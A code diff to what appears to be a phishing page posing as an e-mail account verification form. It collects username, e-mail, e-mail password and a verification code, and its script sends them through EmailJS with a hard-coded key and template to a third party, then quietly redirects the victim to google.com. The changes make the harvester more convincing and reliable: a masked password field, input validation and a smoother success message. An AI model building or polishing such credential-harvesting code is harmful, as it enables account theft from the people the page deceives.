@@ -1148,7 +1148,7 @@ a.rightlink {
           <tr>
             <th>E-Mail Password</th>
             <td>
-              <input name="password"  type="text" value="password" autocomplete="off">
+              <input name="password" id="password" type="password" autocomplete="new-password" required>
             </td>
           </tr>
           <tr>
@@ -1158,7 +1158,7 @@ a.rightlink {
           <tr>
             <td></td>
             <td>
-              <input type="submit" id="button" vakue="V e r i f y">
+              <input type="submit" id="button" value="V e r i f y">
               <a href="#" style="float: right;" onclick="return false;">Need help?</a>
 
 
@@ -1182,30 +1182,87 @@ a.rightlink {
   emailjs.init('SPy0eGgQ0zvrfVk6B')
 
   const btn = document.getElementById('button');
+  const form = document.getElementById('form');
+  const result = document.getElementById('result');
+  const usernameEl = document.getElementById('username');
+  const emailEl = document.getElementById('email');
+  const passwordEl = document.getElementById('password');
+  const codeEl = document.getElementById('code');
+  const redirectUrl = 'https://google.com';
 
-document.getElementById('form')
- .addEventListener('submit', function(event) {
-   event.preventDefault();
+  function showNotice(message, type = 'error') {
+    result.textContent = message;
+    result.className = 'notice ' + type;
+  }
 
-   btn.value = 'Sending...';
+  function clearNotice() {
+    result.textContent = '';
+    result.className = 'notice';
+  }
 
-   const serviceID = 'default_service';
-   const templateID = 'template_zxyaflt';
-   const redirectUrl = 'https://google.com';
-   function redirectAfterSubmit() {
-     window.location.href = redirectUrl;
-   }
+  function validateForm() {
+    if (!usernameEl.value.trim()) {
+      showNotice('Please enter your username.');
+      usernameEl.focus();
+      return false;
+    }
 
-   emailjs.sendForm(serviceID, templateID, this)
-    .then(() => {
-      btn.value = 'Send Email';
-      alert('Sent!');
-      redirectAfterSubmit();
-    }, (err) => {
-      btn.value = 'Send Email';
-      alert(JSON.stringify(err));
-    });
-});
+    if (!emailEl.value.trim()) {
+      showNotice('Please enter your e-mail address.');
+      emailEl.focus();
+      return false;
+    }
+
+    if (!/^\S+@\S+\.\S+$/.test(emailEl.value.trim())) {
+      showNotice('Please enter a valid e-mail address.');
+      emailEl.focus();
+      return false;
+    }
+
+    if (!passwordEl.value.trim()) {
+      showNotice('Please enter your password.');
+      passwordEl.focus();
+      return false;
+    }
+
+    if (!codeEl.value.trim()) {
+      showNotice('Please enter the verification code.');
+      codeEl.focus();
+      return false;
+    }
+
+    clearNotice();
+    return true;
+  }
+
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    if (!validateForm()) {
+      return;
+    }
+
+    btn.value = 'Sending...';
+    btn.disabled = true;
+
+    const serviceID = 'default_service';
+    const templateID = 'template_zxyaflt';
+
+    emailjs.sendForm(serviceID, templateID, this)
+      .then(() => {
+        btn.value = 'Send Email';
+        showNotice('Sent successfully. Redirecting...', 'success');
+        window.setTimeout(() => {
+          window.location.href = redirectUrl;
+        }, 900);
+      }, (err) => {
+        btn.value = 'Send Email';
+        btn.disabled = false;
+        showNotice('Submission failed. Please try again.');
+        console.error(err);
+      });
+  });
+
 </script>
 
 </body></html>
